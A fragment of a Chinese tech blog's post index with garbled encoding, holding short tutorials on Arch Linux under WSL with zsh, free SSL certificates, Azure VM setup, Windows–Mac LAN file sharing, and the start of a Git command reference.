é…ç½®ç¬¬ä¸€æ¬¡å®‰è£…å®Œæˆä¹‹åï¼Œéœ€è¦æ‰‹åŠ¨åšä¸€äº›é…ç½®ï¼Œåˆå§‹åŒ–å¹¶æ›´æ–°ç³»ç»Ÿã€‚ åœ¨ç»ˆç«¯æˆ–CMD ä¸­è¾“å…¥WSL è¿›å…¥Arch Linuxã€‚ ç¼–è¾‘ /etc/pacman.d/mirrorlistï¼Œå»æ‰ChinaèŠ‚ç‚¹ å‰é¢çš„##ï¼Œä»¥åŠä¸‹é¢çš„Serverä¸‹é¢çš„##ã€‚ åˆå§‹åŒ–123pacman-key --initpacman-key --populate archlinux æ›´æ–°12345&#x2F;&#x2F; æ›´æ–° GPG keypacman -Sy archlinux-keyring&#x2F;&#x2F; æ›´æ–°ç³»ç»Ÿï¼Œé€Ÿåº¦å¿«æ…¢ä¸é•œåƒæºæœ‰å…³pacman -Syyu base base-devel ä¸ªæ€§åŒ–Arch Linux é»˜è®¤çš„æ ·å¼å¹¶ä¸å¥½çœ‹ï¼Œå’ŒCMD éƒ½æ˜¯é»‘æ¼†æ¼†çš„ä¸€ç‰‡ã€‚ å› ä¸ºArch Linux é»˜è®¤ä½¿ç”¨çš„ Bashï¼Œå¦‚æœä½ å’Œæˆ‘ä¸€æ ·ï¼Œæ›´å–œæ¬¢ Zsh çš„è¯ï¼Œé‚£å°±è¯·ç»§ç»­çœ‹ä¸‹å»ã€‚ å®‰è£…ZSHæ—¢ç„¶è¦å®‰è£…Zshï¼Œé‚£å°±ä¸å¾—ä¸å®‰è£…oh-my-zshäº†ï¼Œæ‰€ä»¥è¿™é‡Œä¸€èµ·å®‰è£…äº†ã€‚ 1pacman -S zsh oh-my-zsh-git å®‰è£…Spaceship ZSHSpaceship ZSH æ˜¯Zsh çš„æç¤ºç¬¦å·¥å…·ã€‚ å…‹éš†ä»“åº“ 1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; é“¾æ¥æ–‡ä»¶ 1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; æ›´æ”¹é»˜è®¤theme 12# vim ~&#x2F;.zshrcZSH_THEME&#x3D;&quot;spaceship&quot; é‡å¯ç»ˆç«¯å³å¯ã€‚ å‚è€ƒé“¾æ¥ å®‰è£…ArchWSLï¼ˆWindows ä¸‹çš„Arch Linux å­ç³»ç»Ÿï¼‰","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"å¦‚ä½•ç”³è¯·å…è´¹çš„SSL è¯ä¹¦","slug":"how-to-apply-for-a-free-ssl-certificate","date":"2020-08-14T10:03:13.000Z","updated":"2020-12-21T03:43:39.608Z","comments":true,"path":"how-to-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•ç”³è¯·å…è´¹çš„ SSL è¯ä¹¦ï¼Œé€šè¿‡æœ¬æ–‡ä»‹ç»çš„æ–¹å¼æ‰€ç”³è¯·çš„è¯ä¹¦æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œè¯·è°¨æ…é€‰æ‹©ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•ç”³è¯·å…è´¹çš„ SSL è¯ä¹¦ï¼Œé€šè¿‡æœ¬æ–‡ä»‹ç»çš„æ–¹å¼æ‰€ç”³è¯·çš„è¯ä¹¦æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œè¯·è°¨æ…é€‰æ‹©ã€‚ å‡†å¤‡åƒè¿™ç±»æä¾›å…è´¹ SSL è¯ä¹¦çš„ç½‘ç«™éå¸¸å¤šï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„å¹³å°æ˜¯ FreeSSL.cn ã€‚ åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œä½ å¾—å‡†å¤‡ä¸€ä¸ªé‚®ç®±ï¼Œæ³¨å†Œ ä¸€ä¸ª FreeSSL.cn è´¦å·ï¼Œç„¶åç™»å½•ã€‚ å°†éœ€è¦ç”³è¯·è¯ä¹¦çš„åŸŸåå¡«å†™åœ¨è¾“å…¥æ¡†ä¸­ï¼Œé€‰æ‹©å¤šåŸŸåé€šé…ç¬¦ï¼Œç„¶åç‚¹å‡»åˆ›å»ºå…è´¹çš„SSL è¯ä¹¦ã€‚ æˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯æ³›åŸŸåï¼Œæ ¹æ®ä½ è‡ªå·±çš„å®é™…æƒ…å†µï¼Œå»åˆ›å»ºç›¸åº”å­åŸŸåçš„è¯ä¹¦ï¼š example.comï¼šä¸»åŸŸå *.example.comï¼šæ³›åŸŸå é€‰æ‹©æµè§ˆå™¨ç”Ÿæˆã€‚ ç‚¹å‡»ç¡®è®¤åˆ›å»ºã€‚ æ·»åŠ TXT è®°å½•æ‰“å¼€éœ€è¦ç”³è¯· SSL è¯ä¹¦çš„åŸŸåç®¡ç†åå°ï¼Œæ‰¾åˆ° DNS ç®¡ç†ã€‚ æ·»åŠ  TXT éªŒè¯ï¼Œå°†åˆšæ‰çš„è®°å½•å€¼ä¸TXT è®°å½•æ·»åŠ åˆ°å¯¹åº”çš„TXT ç±»å‹ã€‚ æ³¨æ„âš ï¸ï¼šè®°å½•å€¼åŒºåˆ†å¤§å°å†™ã€‚ æ£€æµ‹æ˜¯å¦é…ç½®æˆåŠŸã€‚ åœ¨å®ŒæˆéªŒè¯ä¹‹å‰ä¸è¦ç¦»å¼€å½“å‰é¡µé¢ï¼ŒéªŒè¯æˆåŠŸä¹‹åï¼Œç‚¹å‡»éªŒè¯ã€‚ å¦‚æœé…ç½®æˆåŠŸæ²¡é—®é¢˜ï¼Œå°±å¯ä»¥ç‚¹å‡»éªŒè¯ï¼Œä¸‹è½½è¯ä¹¦å°±å®Œæˆäº†ã€‚ æ³¨æ„âš ï¸ï¼šä½¿ç”¨æ­¤æ–¹å¼è·å–çš„è¯ä¹¦ï¼Œæœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•åˆ›å»ºå¯åŠ¨ Azure å®ä¾‹","slug":"teach-you-how-to-create-and-start-an-azure-instance","date":"2020-08-12T15:49:19.000Z","updated":"2020-08-27T06:26:47.806Z","comments":true,"path":"teach-you-how-to-create-and-start-an-azure-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¦‚ä½•åˆ›å»ºå¯ç”¨ Azure å®ä¾‹ã€‚å› ä¸ºè¿™æ–¹é¢å¯ä»¥æ‰¾åˆ°çš„èµ„æ–™æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ã€‚ ä¸€æ˜¯æ–¹ä¾¿è‡ªå·±ä»¥åå›é¡¾ï¼ŒäºŒæ˜¯ç»™å…¶ä»–äººä½œä¸ºå‚è€ƒã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¦‚ä½•åˆ›å»ºå¯ç”¨ Azure å®ä¾‹ã€‚å› ä¸ºè¿™æ–¹é¢å¯ä»¥æ‰¾åˆ°çš„èµ„æ–™æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ã€‚ ä¸€æ˜¯æ–¹ä¾¿è‡ªå·±ä»¥åå›é¡¾ï¼ŒäºŒæ˜¯ç»™å…¶ä»–äººä½œä¸ºå‚è€ƒã€‚ å‡†å¤‡å› ä¸ºæœ¬æ–‡æ˜¯åˆ›å»ºå¾®è½¯äº‘ï¼Œæ‰€ä»¥é¦–å…ˆä½ å¾—æœ‰ä¸€ä¸ªå¾®è½¯è´¦å·ã€‚ æ‰“å¼€ Microsoft Azure è¿›è¡Œç™»å½•ï¼Œç™»å½•æˆåŠŸä¹‹åï¼Œè¿›å…¥äº‘æœåŠ¡ç®¡ç†åå°ã€‚ åˆ›å»ºå®ä¾‹ç‚¹å‡»åˆ›å»ºèµ„æºã€‚ å¯ä»¥æœç´¢ä½ æƒ³åˆ›å»ºçš„äº‘æœåŠ¡ç±»å‹ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ Ubuntu Server 18.04 LTSã€‚ ç‚¹å‡»åˆ›å»ºã€‚ æ”¾å¿ƒï¼Œè¿™é‡Œçš„åˆ›å»ºå¹¶ä¸æ˜¯æ­£çœŸæ„ä¹‰ä¸Šçš„åˆ›å»ºã€‚æ¥ä¸‹æ¥éœ€è¦ä¸ºæœºå™¨é¢„è®¾é…ç½®ã€‚ ä¸‹é¢å¯¹å¸¸è§çš„é…ç½®è¿›è¡Œç®€å•è¯´æ˜ï¼š èµ„æºç»„ï¼šç”¨æ¥åˆ†é…ä¸€äº›æƒé™ä»¥åŠç­–ç•¥ã€‚ è™šæ‹Ÿæœºåç§°ï¼šä½ å¸Œæœ›ç”¨ä»€ä¹ˆåç§°æ¥ç§°å‘¼è¿™å°æœºå™¨ï¼ˆé€šå¸¸æ˜¯è‹±æ–‡ï¼‰ åŒºåŸŸï¼šé€‰æ‹©æœºå™¨æ‰€åœ¨åœ°åŒº æ˜ åƒï¼šé€‰æ‹©æ“ä½œç³»ç»Ÿ å¤§å°ï¼šé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„è´Ÿè´£ç±»å‹ï¼Œå¯ä»¥ç†è§£æˆæœºå™¨çš„ç¡¬ä»¶é…ç½®ã€‚ èº«ä»½éªŒè¯ç±»å‹ï¼šé€šå¸¸æœ‰ä¸¤ç§ï¼šssh å¯†é’¥å’Œå¯†ç ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨å¯†é’¥è€Œä¸ä½¿ç”¨å¯†ç ï¼ˆå¯†å“¦å­˜åœ¨è¢«æš´åŠ›ç ´è§£çš„é£é™©ï¼‰ã€‚ ç”¨æˆ·åï¼šå¾®è½¯äº‘é»˜è®¤æ²¡æœ‰ç»™root ç”¨æˆ·ï¼Œè¿™é‡Œéœ€è¦æŒ‡å®šç”¨æˆ·åç§°ã€‚ å…¬å…±å…¥ç«™ç«¯å£ï¼šé€šå¸¸æ˜¯åªå¼€å¯HTTP (80)ã€HTTPS (443)ã€SSH (22) ã€‚ å®ŒæˆåŸºæœ¬é…ç½®ä¹‹åï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ï¼šç£ç›˜ã€‚ Azure é»˜è®¤åªæœ‰ä¸€ä¸ªç”¨äºçŸ­æœŸå­˜å‚¨çš„ä¸´æ—¶ç›˜ï¼Œè€Œä¸´æ—¶ç›˜é€šå¸¸éƒ½å¾ˆå°ã€‚ é»˜è®¤çš„ç£ç›˜å¾ˆå°ï¼Œå¦‚æœæƒ³æ‰©å¤§æœ‰ä¸¤ç§æ–¹å¼ï¼š åˆ›å»ºæ–°çš„ç£ç›˜ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‚è½½ã€‚ æ›´æ”¹é»˜è®¤ç£ç›˜çš„å¤§å°ã€‚ é…ç½®å®Œç£ç›˜ä¹‹åï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ï¼šç½‘ç»œã€‚ ç½‘ç»œé…ç½®ï¼Œå…¬ç”¨ip å¯ä»¥é€‰æ‹©æ— ï¼Œåé¢å†å»æ–°å»ºã€‚ ç„¶åç‚¹å‡»ä¸‹ä¸€æ­¥ï¼šç®¡ç†ã€‚ ç®¡ç†ã€é«˜çº§ã€æ ‡è®°è¿™ä¸€å—ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€æ±‚å¯ä»¥ç›´æ¥ä½¿ç”¨é»˜è®¤é…ç½®ã€‚ æœ€åç‚¹å‡»æŸ¥çœ‹+åˆ›å»ºï¼Œå¯ä»¥çœ‹åˆ°é¢„è®¾çš„é…ç½®ä¿¡æ¯ï¼Œå¦‚æœç¬¦åˆé¢„æœŸï¼Œç‚¹å‡»åˆ›å»ºã€‚ ä¸‹è½½ç§é’¥å¹¶ä¿å­˜å¥½ã€‚ æ­¤æ—¶ï¼Œè™½ç„¶å·²ç»åˆ›å»ºå¥½è™šæ‹Ÿæœºï¼Œä½†æ˜¯è¿˜ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå› ä¸ºæ²¡æœ‰é…ç½®IPã€‚ å…³è”IPAzure å’Œ AWS ä¸åŒï¼Œå®ƒå¹¶æ²¡æœ‰å¼¹æ€§IP çš„æ¦‚å¿µï¼Œå¦‚æœéœ€è¦é…ç½®IPï¼Œéœ€è¦åœ¨æœç´¢æ ä¸­æœç´¢å…¬å…±IPåœ°å€ï¼Œ ç‚¹å‡»ç¬¬ä¸€ä¸ªæœç´¢ç»“æœã€‚ ç‚¹å‡»æ·»åŠ ã€‚ é…ç½®IP åŸºæœ¬ä¿¡æ¯ï¼Œç„¶åç‚¹å‡»åˆ›å»ºã€‚ æ­¤æ—¶ï¼Œåªæ˜¯åˆ›å»ºäº†å†…ç½‘IPï¼Œå¹¶æ²¡æœ‰ä¸å¤–ç½‘IP åœ°å€è¿›è¡Œå…³è”ï¼Œ ç‚¹å‡»åˆšæ‰æ–°å»ºçš„å…¬å…± IP åœ°å€ï¼Œç‚¹å‡»é…ç½®ã€‚ èµ„æºç±»å‹é€‰æ‹©ç½‘ç»œæ¥å£ï¼Œç½‘ç»œæ¥å£ä¸å¯¹åº”çš„å®ä¾‹è¿›è¡Œå…³è”ã€‚ å…³è”æˆåŠŸä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œè¿æ¥äº†ã€‚ è¿æ¥ æ‰“å¼€ç»ˆç«¯ è¯·ç¡®ä¿ä½ å¯¹ç§é’¥å…·æœ‰åªè¯»è®¿é—®æƒé™ã€‚ 1chmod 400 &lt;ç§é’¥&gt; è¿è¡Œä»¥ä¸‹ç¤ºä¾‹å‘½ä»¤ä»¥è¿æ¥åˆ° VMã€‚ 1ssh -i &lt;ç§é’¥è·¯å¾„&gt; user@ip_address userï¼šè¡¨ç¤ºVM ç”¨æˆ· ip_addressï¼šè¡¨ç¤ºå¤–ç½‘IP åœ°å€ æ‰©å¤§é»˜è®¤ç£ç›˜å¤§å°ä¸Šé¢ç®€å•æåˆ°è¿‡ï¼Œå¦‚æœæƒ³è¦æ‰©å¤§é»˜è®¤ç£ç›˜çš„å¤§å°ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š æ·»åŠ æ–°ç£ç›˜ã€‚è¿™ç§æ–¹å¼éœ€è¦æ‰‹åŠ¨æŒ‚è½½ï¼Œå¦‚æœå¯¹linux å¹¶ä¸ç†Ÿæ‚‰ï¼Œè¿™ç§æ–¹å¼ä¸æ¨èæ–°æ‰‹ç”¨æˆ·ä½¿ç”¨ã€‚ æ›´æ”¹é»˜è®¤ç£ç›˜å¤§å°ã€‚ ç¬¬äºŒç§æ–¹å¼å¹¶ä¸èƒ½ç›´æ¥æ›´æ”¹ï¼Œéœ€è¦å…ˆå°†æœåŠ¡å™¨åœæ‰ï¼ˆæ³¨æ„âš ï¸ï¼šä¸æ˜¯åˆ é™¤ï¼‰ã€‚ æœç´¢ç£ç›˜ï¼Œç‚¹å‡»ç¬¬ä¸€ä¸ªæœç´¢ç»“æœã€‚ ç‚¹å‡»éœ€è¦æ‰©å¤§çš„ç£ç›˜å®ä¾‹ï¼Œæ³¨æ„ï¼šåªèƒ½æ‰©å¤§ï¼Œä¸èƒ½ç¼©å°ã€‚ ç„¶åç‚¹å‡»ä¿å­˜å³å¯ã€‚ æ€»ç»“è‡³æ­¤ï¼Œå°±å·²ç»å®Œæˆäº†Azure çš„åˆ›å»ºäº†ï¼Œè¿™æ–¹é¢éœ€è¦å­¦ä¹ çš„è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªæ˜¯ç®€å•çš„æ•´ç†äº†ä¸€ä¸‹è‡ªå·±é‡åˆ°çš„é—®é¢˜ã€‚ æœ‰äº›åœ°æ–¹å¯èƒ½æ²¡è¯´æ¸…æ¥šï¼Œä½†å¦‚æœèƒ½å¸®åˆ°ä½ é‚£çœŸæ˜¯å¤ªå¥½äº†","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"Windows å’Œ Mac åœ¨å±€åŸŸç½‘å†…å¦‚ä½•å…±äº«æ–‡ä»¶ï¼Ÿ","slug":"how-do-windows-and-mac-share-files-in-the-local-area-network","date":"2020-08-11T14:11:18.000Z","updated":"2020-08-13T11:43:07.419Z","comments":true,"path":"how-do-windows-and-mac-share-files-in-the-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/","excerpt":"æ¯å½“æ‰‹ä¸Šæœ‰ä¸¤å°æˆ–å¤šå°ç”µè„‘æ—¶ï¼Œå¦‚æœæƒ³ä¼ é€ä¸€ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯å¾®ä¿¡ã€QQç­‰è¿™ç±»å·¥å…·ã€‚å¦‚æœç¢°åˆ°äº†å¤§ä¸€ç‚¹çš„æ–‡ä»¶ï¼Œå°±å¾—æ¢æˆç½‘ç›˜æˆ–è€…ç§»åŠ¨ç¡¬ç›˜ã€‚ èº«ä¸ºä¸€ä¸ªåšå¼€å‘è€…ï¼Œè¿™ç§åšæ³•æ¯”è¾ƒlowï¼Œæ‰€ä»¥æ‰¾äº†å‡ ç¯‡æ–‡ç« å­¦ä¹ åˆ°äº†å¦‚ä½•åœ¨å±€åŸŸç½‘å†…å…±äº«æ–‡ä»¶ã€‚","text":"æ¯å½“æ‰‹ä¸Šæœ‰ä¸¤å°æˆ–å¤šå°ç”µè„‘æ—¶ï¼Œå¦‚æœæƒ³ä¼ é€ä¸€ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯å¾®ä¿¡ã€QQç­‰è¿™ç±»å·¥å…·ã€‚å¦‚æœç¢°åˆ°äº†å¤§ä¸€ç‚¹çš„æ–‡ä»¶ï¼Œå°±å¾—æ¢æˆç½‘ç›˜æˆ–è€…ç§»åŠ¨ç¡¬ç›˜ã€‚ èº«ä¸ºä¸€ä¸ªåšå¼€å‘è€…ï¼Œè¿™ç§åšæ³•æ¯”è¾ƒlowï¼Œæ‰€ä»¥æ‰¾äº†å‡ ç¯‡æ–‡ç« å­¦ä¹ åˆ°äº†å¦‚ä½•åœ¨å±€åŸŸç½‘å†…å…±äº«æ–‡ä»¶ã€‚ å‡†å¤‡è¿™é‡Œå‡†å¤‡çš„æ˜¯ç”¨ Windows ä½œä¸ºä¸»æœºåˆ›å»ºå…±äº«æ–‡ä»¶ã€‚ é¦–å…ˆè¦ç¡®è®¤å‡†å¤‡ä¼ è¾“æ–‡ä»¶çš„ Windows å’Œ Mac æ˜¯åœ¨åŒä¸€ä¸ªè·¯ç”±å™¨ç»„æˆçš„å±€åŸŸç½‘å†…ã€‚ ç„¶åæ‰“å¼€ Windows çš„æ–‡ä»¶èµ„æºç®¡ç†å™¨ï¼Œåœ¨å…¶æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼Œåç§°éšæ„ï¼Œè‡ªå·±çŸ¥é“å°±å¥½äº†ã€‚ å³é”®æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»å±æ€§ï¼Œæ‰¾åˆ° å…±äº« Tabï¼Œç‚¹å‡»é«˜çº§å…±äº«ã€‚ å‹¾é€‰å…±äº«æ­¤æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»ç¡®å®šã€‚ ç„¶åå›åˆ°å…±äº«æ–‡ä»¶å¤¹ï¼Œå³é”®ç‚¹å‡»å±æ€§ï¼Œæ‰¾åˆ°å…±äº«ï¼Œé€‰æ‹©ç”¨æˆ·ã€‚ å¦‚æœå…è®¸å…¶ä»–äººå†™å…¥ï¼Œåˆ™é€‰æ‹© Everyoneï¼Œæ›´æ”¹ä¸ºï¼šè¯»å–/å†™å…¥ã€‚ è®¿é—®Windows æœ¬æœºè®¿é—®123# ComputerName è¡¨ç¤ºï¼šä½ çš„è®¡ç®—æœºåç§°# ShareFolders è¡¨ç¤ºï¼šå…±äº«æ–‡ä»¶å¤¹åç§°file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F; Mac å±€åŸŸç½‘è®¿é—®Mac æœ‰ä¸¤ç§æ–¹å¼ï¼š é€šè¿‡æµè§ˆå™¨è®¿é—® é€šè¿‡è®¿è¾¾è®¿é—®ï¼Œä½¿ç”¨å¿«æ·é”® âŒ˜ + k123# ComputerName è¡¨ç¤ºï¼šéœ€è¦è®¿é—®çš„è®¡ç®—æœºåç§°# ShareFolders è¡¨ç¤ºï¼šå…±äº«æ–‡ä»¶å¤¹åç§°smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F; é€šè¿‡éªŒè¯ä¹‹åï¼Œå°±èƒ½è®¿é—®åˆ°å…±äº«æ–‡ä»¶å¤¹äº†ã€‚ åˆ°è¿™é‡Œåº”è¯¥å°±èƒ½é¡ºåˆ©çš„åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªç”µè„‘ä¹‹é—´ä¼ è¾“æ–‡ä»¶äº†ã€‚ å¦‚æœè¿˜ä¸èƒ½è®¿é—®ï¼Œå¯ä»¥ping ä¸€ä¸‹å¯¹æ–¹çš„ä¸»æœºï¼Œå¦‚æœæ²¡æœ‰pingé€šï¼Œæ£€æŸ¥ä¸€ä¸‹é˜²ç«å¢™è®¾ç½®ã€‚ å¦‚æœé˜²ç«å¢™å…³ç€ï¼Œé‚£ä¹ˆä¼š ping ä¸é€šã€‚ å‚è€ƒé“¾æ¥ Windows å’Œ Mac åœ¨å±€åŸŸç½‘å†…å¦‚ä½•å…±äº«æ–‡ä»¶ï¼Ÿ å…±äº«æ–‡ä»¶å¤¹ ä¸€ä¸ªå®ç°Windowså’ŒMacä¹‹é—´æ–‡ä»¶äº’ä¼ çš„ç®€å•æ–¹æ³•","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Git å¸¸ç”¨å‘½ä»¤å‚è€ƒæ‰‹å†Œ","slug":"git-common-command-reference-manual","date":"2020-08-11T01:22:19.000Z","updated":"2020-08-11T01:24:32.528Z","comments":true,"path":"git-common-command-reference-manual/","link":"","permalink":"https://www.0x2beace.com/git-common-command-reference-manual/","excerpt":"è™½ç„¶æ¯å¤©éƒ½åœ¨ä½¿ç”¨Gitï¼Œä½†æ˜¯æœ‰äº›å‘½ä»¤å¤ªä¹…ä¸ä½¿ç”¨ï¼Œè¿˜æ˜¯ä¼šå¿˜è®°ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯æ•´ç†é‚£äº›Git å¸¸ç”¨å‘½ä»¤ã€‚","text":"è™½ç„¶æ¯å¤©éƒ½åœ¨ä½¿ç”¨Gitï¼Œä½†æ˜¯æœ‰äº›å‘½ä»¤å¤ªä¹…ä¸ä½¿ç”¨ï¼Œè¿˜æ˜¯ä¼šå¿˜è®°ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯æ•´ç†é‚£äº›Git å¸¸ç”¨å‘½ä»¤ã€‚ åŸºç¡€é…ç½®Gitçš„è®¾ç½®æ–‡ä»¶ä¸º.gitconfigï¼Œå®ƒå¯ä»¥åœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹ï¼ˆå…¨å±€é…ç½®ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨é¡¹ç›®ç›®å½•ä¸‹ï¼ˆé¡¹ç›®é…ç½®ï¼‰ã€‚ 1234567891011121314151617181920# æŸ¥çœ‹å…¨å±€é…ç½®åˆ—è¡¨$ git config --global --list# æŸ¥çœ‹å±€éƒ¨é…ç½®åˆ—è¡¨$ git config --local --list# è®¾ç½®å…¨å±€ç”¨æˆ·å&#x2F;é‚®ç®±$ git config --global user.name &quot;yourName&quot;$ git config --global user.email &quot;example@example.com&quot;# è®¾ç½®æœ¬åœ°å½“å‰å·¥ä½œåŒºä»“åº“ç”¨æˆ·å&#x2F;é‚®ç®±$ git config --local user.name &quot;yourName&quot;$ git config --local user.email &quot;example@example.com&quot;# å°†é»˜è®¤æ–‡æœ¬ç¼–è¾‘å™¨è®¾ç½®ä¸º emacs&#x2F;vim$ git config --global core.editor emacs&#x2F;vim# ç¼–è¾‘å½“å‰ä»“åº“çš„é…ç½®æ–‡ä»¶$ git config -e # ç­‰ä»·ä¸ vim .git&#x2F;config# ç¼–è¾‘å…¨å±€é…ç½®æ–‡ä»¶$ git config --global -e å‘½ä»¤åˆ«åé…ç½®12345678# æ·»åŠ åˆ«å git st &#x3D; git status$ git config --global alias.st status# åˆ é™¤ st åˆ«å$ git config --global --unset alias.st# æ‰§è¡Œå¤–éƒ¨å‘½ä»¤, åªè¦åœ¨å‰é¢åŠ  ! å³å¯$ git config --global alias.st &#39;!echo hello&#39;; ä»£ç†é…ç½®å¦‚æœæƒ³çŸ¥é“å…³äºGité…ç½®ä»£ç†çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ 1234567891011# é…ç½®HTTP&#x2F;HTTPS ä»£ç†$ git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087# æŸ¥çœ‹$ git config --global --get http.proxy$ git config --global --get https.proxy# å–æ¶ˆä»£ç†$ git config --global --unset http.proxy$ git config --global --unset https.proxy ç”ŸæˆSSHKeyå…³äºå¦‚ä½•é…ç½®ssh config å¯ä»¥æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ 12345# å°†ssh keyç”Ÿæˆåœ¨é»˜è®¤ä¸‹ï¼Œä¹Ÿå°±æ˜¯&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;ã€‚$ ssh-keygen -t rsa -C &quot;youremail&quot;# å°†ssh keyç”Ÿæˆåœ¨æŒ‡å®šè·¯å¾„ä¸‹çš„æŒ‡å®šæ–‡ä»¶åä¸­$ ssh-keygen -t rsa -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot; å‡†å¤‡å·¥ä½œ1234567891011# åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªGitä»£ç åº“$ git init# æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå°†å…¶åˆå§‹åŒ–ä¸ºGitä»£ç åº“$ git init [project-name]# ä¸‹è½½ä¸€ä¸ªé¡¹ç›®å’Œå®ƒçš„æ•´ä¸ªä»£ç å†å²$ git clone [url] [project-name]# æµ…å…‹éš†, å†å²è®°å½•åªå…‹éš†æœ€åä¸€æ¡, å‡å°‘å…‹éš†æ—¶é—´$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git åŸºç¡€æ“ä½œåŸºç¡€æ“ä½œä¸­çš„å‘½ä»¤éƒ½æ˜¯æ—¥å¸¸ä½¿ç”¨é¢‘ç‡éå¸¸é«˜çš„ã€‚ æ–‡ä»¶çŠ¶æ€12345678# æŸ¥çœ‹å·¥ä½œåŒºçŠ¶æ€$ git status# åˆ—å‡ºæ²¡æœ‰è¢« .gitignore 